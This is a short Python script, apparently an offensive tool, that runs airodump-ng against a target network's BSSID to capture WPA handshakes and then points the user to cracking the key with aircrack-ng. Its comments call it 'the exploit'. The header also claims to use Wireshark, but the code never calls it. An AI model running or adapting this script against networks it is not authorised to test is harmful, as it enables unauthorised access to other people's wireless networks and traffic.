# -------------------------------------------
# Wi-Fi Network Sniffing Using Wireshark & Airodump-ng
# -------------------------------------------
# Functionality:
# - Sniffs Wi-Fi traffic on a target network.
# - Captures WPA handshakes for later cracking.
# - Identifies network clients and devices.

# Devices being used:
# - Airodump-ng: Captures Wi-Fi traffic, including handshakes.
# - Wireshark: Analyzes captured network traffic.

# Example Usage:
# 1. Run the exploit to sniff and capture WPA handshakes:
#    python sniff_wifi_network.py --interface <wifi_interface> --target <target_network>

import subprocess
import argparse

def sniff_wifi_traffic(interface, target_network):
    """
    Sniffs Wi-Fi traffic using Airodump-ng and Wireshark to capture handshakes.
    """
    print(f"[+] Sniffing Wi-Fi network: {target_network} on interface: {interface}...")
    subprocess.run(["airodump-ng", interface, "--bssid", target_network, "--write", "handshake_capture"])  # Capture handshake
    print("[✔] Handshake capture complete. You can now attempt to crack the WPA key using tools like aircrack-ng.")

# Main function to handle user input and start sniffing
def main():
    parser = argparse.ArgumentParser(description="Wi-Fi Network Sniffing using Airodump-ng and Wireshark")
    parser.add_argument("--interface", required=True, help="Wi-Fi interface to sniff on (e.g., wlan0).")
    parser.add_argument("--target", required=True, help="Target network's BSSID.")
    args = parser.parse_args()

    sniff_wifi_traffic(args.interface, args.target)

# Run the exploit
if __name__ == "__main__":
    main()
